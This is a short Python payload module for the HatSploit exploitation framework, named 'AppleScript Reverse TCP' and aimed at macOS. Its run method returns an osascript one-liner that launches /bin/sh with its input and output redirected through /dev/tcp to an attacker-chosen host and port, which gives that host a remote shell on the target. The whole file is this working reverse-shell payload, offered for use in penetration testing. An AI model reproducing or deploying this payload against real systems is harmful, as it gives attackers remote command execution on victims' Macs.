#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload):
    details = {
        'Category': "singler",
        'Name': "AppleScript Reverse TCP",
        'Payload': "macos/generic/applescript_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "AppleScript reverse TCP payload.",
        'Architecture': "generic",
        'Platform': "macos",
        'Rank': "high",
        'Type': "reverse_tcp"
    }

    def run(self):
        remote_host = self.handler['RHOST']
        remote_port = self.handler['RPORT']

        payload = f"osascript -e 'do shell script \"/bin/sh &>/dev/tcp/{remote_host}/{remote_port} 0>&1 &\"'"
        return payload
